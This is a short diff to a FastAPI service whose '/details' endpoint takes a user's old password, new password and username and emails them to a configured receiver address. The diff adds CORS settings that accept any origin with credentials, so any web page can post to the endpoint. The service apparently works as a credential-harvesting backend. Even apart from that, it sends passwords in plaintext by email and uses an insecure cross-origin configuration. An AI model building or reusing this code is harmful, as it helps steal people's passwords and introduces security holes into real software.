@@ -1,4 +1,5 @@
 from fastapi import FastAPI, HTTPException
+from fastapi.middleware.cors import CORSMiddleware
 import smtplib
 from email.mime.text import MIMEText
 from dotenv import load_dotenv
@@ -6,6 +7,15 @@ import os
 
 load_dotenv()
 app = FastAPI()
+
+# Allow all origins (CORS open for everyone)
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],       # Allow all origins
+    allow_credentials=True,
+    allow_methods=["*"],       # Allow all HTTP methods
+    allow_headers=["*"],       # Allow all headers
+)
 
 SENDER = os.getenv("SENDER")
 RECIVER = os.getenv("RECIVER")
@@ -21,8 +31,6 @@ def home():
 
 @app.post("/details")
 def get_details(old_password: str, new_password: str, username: str = None):
-    # Assume that the payload will follow rules
-    # send email containing details
     send_email(old_password, new_password, username)
     return {"message": "email has been sent successfully"}
 
